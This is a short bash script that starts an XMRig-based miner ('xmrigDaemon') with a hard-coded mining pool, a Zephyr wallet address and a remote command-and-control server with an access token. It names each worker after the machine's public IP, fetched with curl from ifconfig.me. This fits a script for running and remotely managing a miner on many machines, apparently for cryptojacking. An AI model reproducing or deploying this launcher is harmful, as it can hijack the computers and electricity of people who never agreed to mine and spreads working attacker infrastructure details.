#!/bin/bash
POOL=stratum+ssl://157.230.252.215:80
WALLET=ZEPHsA6L9MHTJ2T922LWjF2CLc6Pzsoi8EYX9HJBgQkv8qYTqsQtBs4FNVuF8ymvyhRfYsLa4EJr7FiQPPTeN8KgJmykU8JXatM.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
cd "$(dirname "$0")"
chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=172.200.229.146:2012 --cc-access-token=kevin --cc-worker-id=${myip}
